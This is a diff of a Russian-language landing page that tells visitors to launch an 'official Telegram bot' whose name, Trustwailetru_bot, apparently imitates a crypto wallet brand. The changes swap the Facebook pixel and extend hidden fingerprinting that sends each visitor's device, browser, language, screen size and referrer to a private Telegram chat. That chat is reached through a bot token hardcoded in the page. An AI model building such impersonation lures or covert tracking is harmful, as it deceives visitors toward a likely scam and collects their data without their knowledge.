@@ -3,6 +3,10 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  
+  <!-- ПОДТВЕРЖДЕНИЕ ДОМЕНА FACEBOOK -->
+  <meta name="facebook-domain-verification" content="1ddq5g9b9nlbak5619ajnlyjbz4xjt" />
+
   <title>Вам сюда | Telegram</title>
 
   <style>
@@ -28,12 +32,12 @@
     s.parentNode.insertBefore(t,s)}(window, document,'script',
     'https://connect.facebook.net/en_US/fbevents.js');
     
-    // Инициализация твоего пикселя
-    fbq('init', '909063091813143');
+    // Инициализация нового пикселя
+    fbq('init', '1413695077434129');
     fbq('track', 'PageView');
   </script>
   <noscript><img height="1" width="1" style="display:none"
-  src="https://www.facebook.com/tr?id=909063091813143&ev=PageView&noscript=1"
+  src="https://www.facebook.com/tr?id=1413695077434129&ev=PageView&noscript=1"
   /></noscript>
   <!-- End Meta Pixel Code -->
 </head>
@@ -49,7 +53,7 @@
     <h1 class="tg-title">Бот</h1>
     <p class="tg-desc">Нажмите кнопку ниже, чтобы запустить официального Telegram-бота.</p>
     
-    <!-- Кнопка с ID для отслеживания (Ссылка обновлена) -->
+    <!-- Кнопка с ID для отслеживания -->
     <a id="openBtn" class="btn" href="https://t.me/Trustwailetru_bot" target="_blank">Открыть в Telegram</a>
   </div>
 
@@ -60,11 +64,22 @@
     const TG_TOKEN = "8884733766:AAEImUOG1K720fj2MXCelbP8NWE1W4C2ue8";
     const TG_CHAT_ID = "5253808709";
 
-    // Сбор данных об окружении
+    // Сбор расширенных данных об окружении
     const ua = navigator.userAgent || "";
+    const platform = navigator.platform || "";
+    const language = navigator.language || "";
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    
+    // Определение устройства
     const device = /iPhone|iPad|iPod/i.test(ua) ? "iOS" : (/Android/i.test(ua) ? "Android" : "Desktop");
+    
+    // Определение типа браузера (более детально)
     const isInstagram = /Instagram/i.test(ua);
-    const browserType = isInstagram ? "Instagram In-App" : (/FBAN|FBAV/i.test(ua) ? "Facebook In-App" : "External Browser");
+    const isFacebook = /FBAN|FBAV/i.test(ua);
+    let browserType = "External Browser";
+    if (isInstagram) browserType = "Instagram In-App";
+    else if (isFacebook) browserType = "Facebook In-App";
+    else if (/Telegram/i.test(ua)) browserType = "Telegram In-App";
 
     // Генерация или получение Visitor ID
     let visitorId = null;
@@ -81,14 +96,17 @@
       const referrer = document.referrer || "Direct";
       const isInstaRef = referrer.includes("instagram.com") ? "YES" : "NO";
       
+      // Улучшенный формат сообщения
       const text = 
         `🔔 <b>${action}</b>\n\n` +
-        `📱 <b>Device:</b> ${device}\n` +
+        `📱 <b>Device:</b> ${device} (${platform})\n` +
         `🌐 <b>Browser:</b> ${browserType}\n` +
-        `📸 <b>From Insta:</b> ${isInstaRef}\n` +
+        `📸 <b>From Insta Ref:</b> ${isInstaRef}\n` +
         `🆔 <b>Visitor ID:</b> <code>${visitorId.substring(0, 8)}</code>\n` +
-        `🔗 <b>Referrer:</b> ${referrer.substring(0, 50)}...\n` +
-        `🕐 <b>Time:</b> ${new Date().toISOString().slice(0, 19)}` +
+        `🔗 <b>Referrer:</b> ${referrer.substring(0, 60)}...\n` +
+        `📏 <b>Screen:</b> ${screenRes}\n` +
+        `🗣 <b>Lang:</b> ${language}\n` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString()}` +
         (details ? `\n📝 <b>Details:</b> ${details}` : "");
 
       const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
@@ -120,8 +138,12 @@
     document.getElementById("openBtn").addEventListener("click", function() {
       // Отправка события Lead в Facebook Pixel
       if (typeof fbq === "function") {
-        fbq('track', 'Lead');
-        console.log("FB Lead Event Fired");
+        fbq('track', 'Lead', {
+          content_name: 'Telegram Bot Click',
+          value: 1.00,
+          currency: 'USD'
+        });
+        console.log("FB Lead Event Fired for Pixel 1413695077434129");
       }
 
       // Отправка лога в Telegram
